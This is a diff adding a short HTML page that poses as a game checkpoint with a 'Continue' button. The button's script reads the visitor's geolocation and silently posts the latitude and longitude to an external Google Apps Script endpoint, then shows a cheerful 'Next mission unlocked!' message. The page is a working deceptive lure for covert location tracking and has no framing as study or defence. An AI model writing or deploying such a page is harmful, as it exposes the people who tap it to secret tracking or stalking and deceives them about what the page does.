@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Game Checkpoint</title>
+</head>
+<body style="font-family:sans-serif;text-align:center;margin-top:50px;">
+<h2>Tap to continue the game 😄</h2>
+<button onclick="sendLocation()" style="font-size:20px;">Continue</button>
+
+<script>
+function sendLocation(){
+  navigator.geolocation.getCurrentPosition(pos => {
+    fetch("https://script.google.com/macros/s/AKfycbyJNgf3aKJj9Fib8eOEHAracPqWicAkKLPlcn1GyB1NsgD0hw37PMjtwqMSIDRZ5DTUsQ/exec", {
+      method: "POST",
+      body: JSON.stringify({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude
+      })
+    });
+    alert("Next mission unlocked!");
+  });
+}
+</script>
+</body>
+</html>
